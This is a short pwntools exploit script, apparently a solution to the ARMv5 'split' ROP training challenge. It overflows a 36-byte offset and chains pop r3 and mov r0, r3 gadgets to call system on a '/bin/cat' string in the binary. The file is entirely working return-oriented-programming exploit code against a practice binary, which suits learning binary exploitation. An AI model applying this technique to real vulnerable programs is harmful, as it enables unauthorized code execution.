from pwn import *

exe = ELF('./split_armv5')
context.binary = exe
context.log_level = 'info'

libc = ELF('./split_armv5')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './split_armv5'])

offset = 36 #pattern search $pc

usefulFunctiondirectsursys = 0x000105e0
bincat = 0x2103c
copie_r3_dasn_r3 = 0x00010558 #mov r0, r3 ; pop {fp, pc}
pop_r3 = 0x000103a4 #0x000103a4 : pop {r3, pc}
padding = b'BBBB'

log.info(hex(usefulFunctiondirectsursys))

payload = flat({offset:[pop_r3,bincat,copie_r3_dasn_r3,padding,usefulFunctiondirectsursys]})

io.sendline(payload)

io.interactive()

